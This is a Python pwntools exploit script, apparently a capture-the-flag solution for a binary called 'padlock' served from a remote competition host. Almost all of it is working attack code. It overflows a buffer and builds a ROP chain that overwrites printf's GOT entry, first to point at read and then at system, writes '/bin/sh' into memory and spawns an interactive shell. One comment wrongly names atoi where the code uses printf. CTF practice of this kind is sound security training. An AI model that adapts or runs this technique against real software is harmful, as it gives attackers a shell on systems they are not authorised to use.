#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./padlock', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OFFSET = 88 #found with cyclic(200)

#this to write in vault "/bin/sh"
mod1 = libc.sym.read - libc.sym.printf
#this is the value to add to printf@got entry, to point to system(). We have to consider read() since we have already modified printf@got entry.
mod2 = libc.sym.system - libc.sym.read 

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r, gdbscript='''
                break printf
                continue
            ''')
            #pause()
    else:
        r = remote('offsec.m0lecon.it',13506)
    return r

def main():
    p = conn()
    print(mod1,mod2)

    #verify base addresses
    print(hex(libc.sym.read))
    print(hex(libc.sym.printf))
    print(hex(elf.sym.pop_rdi_ret))
    print(hex(libc.sym.system))

    p.recvuntil(b'combination: ')
    payload = flat(
        b'A'*OFFSET,

        #we modify the GOT entry of printf to point to read
        p64(elf.sym.pop_rdi_ret),p64(elf.got.printf),
        p64(elf.sym.pop_rsi_ret),p64(mod1),
        p64(elf.sym.add_what_where), 

        #we execute printf@plt, which now points to read()
        p64(elf.sym.pop_rdi_ret),p64(0),
        p64(elf.sym.pop_rsi_ret),p64(elf.sym.vault),
        p64(elf.sym.pop_rdx_ret),p64(256),
        p64(elf.plt.printf),

        #we modify the GOT entry of printf to point to system
        p64(elf.sym.pop_rdi_ret),p64(elf.got.printf),
        p64(elf.sym.pop_rsi_ret),p64(mod2,sign="signed",signed = True),
        p64(elf.sym.add_what_where),

        #we execute atoi@plt, which now points to system()
        p64(elf.sym.pop_rdi_ret),p64(elf.sym.vault),
        p64(elf.plt.printf)
    )
    p.send(payload)
    #pause(), just for debugging
    p.sendline(b'/bin/sh\0')

    p.interactive()

if __name__ == "__main__":
    main()